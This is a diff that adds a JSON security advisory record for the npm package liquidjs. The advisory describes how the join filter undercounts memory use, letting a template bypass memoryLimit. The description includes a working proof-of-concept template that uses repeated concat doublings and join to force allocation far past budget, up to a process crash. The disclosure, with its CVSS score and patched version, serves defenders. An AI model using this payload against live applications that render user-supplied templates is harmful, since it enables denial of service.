@@ -1,0 +1,62 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-09-08T18:10:36Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "liquidjs"
+  },
+  "Advisory": {
+    "DatabaseId": 453366,
+    "Id": "GSA_kwCzR0hTQS00cjZoLTV2ODYtOTRwM84ABur2",
+    "GhsaId": "GHSA-4r6h-5v86-94p3",
+    "References": [
+      {
+        "Url": "https://github.com/harttle/liquidjs/security/advisories/GHSA-4r6h-5v86-94p3"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69222"
+      },
+      {
+        "Url": "https://github.com/harttle/liquidjs/pull/925"
+      },
+      {
+        "Url": "https://github.com/harttle/liquidjs/commit/7ab49f999ac045ec1e87f3a7a9fd68dd9e8602b3"
+      },
+      {
+        "Url": "https://github.com/harttle/liquidjs/releases/tag/v10.27.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-4r6h-5v86-94p3"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-4r6h-5v86-94p3"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-69222"
+      }
+    ],
+    "Description": "### Summary\n\nThe `join` filter (`src/filters/array.ts:8-13`) charges `memoryLimit` by array element **count**, not by the string length it produces, letting a template bypass a configured `memoryLimit` and allocate strings far past budget — bounded only by V8/process limits, not by `memoryLimit`.\n\n### Details\n\n```js\n// src/filters/array.ts:8-13\nexport const join = argumentsToValue(function (this: FilterImpl, v: any[], arg: string) {\n  const array = toArray(v)\n  const sep = isNil(arg) ? ' ' : stringify(arg)\n  const complexity = array.length * (1 + sep.length)   // element COUNT, not element sizes\n  this.context.memoryLimit.use(complexity)\n  return array.join(sep)                                // allocates sum(element lengths) + separators\n})\n```\n\n`concat` (`array.ts:72`) is the enabler: it charges by element count too, but only copies references (cheap for both limiter and heap), so an array's element count can be doubled repeatedly at near-zero real cost. `join` is where the bug lives — it's the call that actually materializes all referenced content into one string, and its own charge (`array.length`) doesn't reflect that.\n\nSame undercounting class as already-fixed `replace` (GHSA-mmg9-6m6j-jqqx), `replace_first` (GHSA-6q5m-63h6-5x4v), `date`/strftime (GHSA-hh27-hf48-9f5q) — `join` wasn't covered. Sibling `array_to_sentence_string` (`src/filters/string.ts:210`) has the identical defect.\n\n### PoC\n\nLive-reproduced against `liquidjs@10.27.1`, Node v24.3.0.\n\n```javascript\nconst { Liquid } = require('liquidjs');\nconst engine = new Liquid({ memoryLimit: 1e7 }); // 10M-unit DoS defense\n\nconst E = 5000, DOUBLINGS = 13;\nconst chunk = 'a'.repeat(E);\nlet tpl = `{%- assign s = \"${chunk}\" -%}{%- assign a = s | split: \"NOSUCHSEP\" -%}`;\nfor (let i = 0; i \u003c DOUBLINGS; i++) tpl += `{%- assign a = a | concat: a -%}`; // 1 -\u003e 8192 elements\ntpl += `{%- assign out = a | join: \"\" -%}{{ out | size }}`;\n\nconst len = Number(engine.renderSync(engine.parse(tpl))); // succeeds — should be blocked\nconsole.log('output length:', len);  // output length: 40960000\n```\n\nVerified by binary-search on `memoryLimit`: render is **blocked at 29573**, **succeeds at 29574** — confirming total charge across `split`+13×`concat`+`join` is exactly 29,574 units (split 5000, concat 16382, join 8192). Output length: **40,960,000** — **1385x** the total charged, \u003e4x the configured 10,000,000-unit limit. Scaling `DOUBLINGS` grows output exponentially for linear charge growth, driving toward gigabytes and a `RangeError: Invalid string length` / V8 OOM crash.\n\n### Impact\n\nAny app rendering attacker-influenced templates with `memoryLimit` set (LiquidJS docs list it as covering \"array concat/join/strftime\") can have that control bypassed by one short template, forcing allocation well past budget up to a process crash. `split`/`concat` are correctly charged; the gap is `join`'s own accounting of its own output. (LiquidJS's security-model docs call these limits \"cooperative safeguards, not strict isolation\" — doesn't change that `join`'s charge is wrong relative to what it allocates.)",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-08T18:10:35Z",
+    "Severity": "HIGH",
+    "Summary": "LiquidJS: Uncontrolled Resource Consumption in `join` filter allows template authors to bypass `memoryLimit` and crash the process",
+    "UpdatedAt": "2026-09-08T18:10:36Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "10.27.2"
+      },
+      "VulnerableVersionRange": "\u003c= 10.27.1"
+    }
+  ]
+}
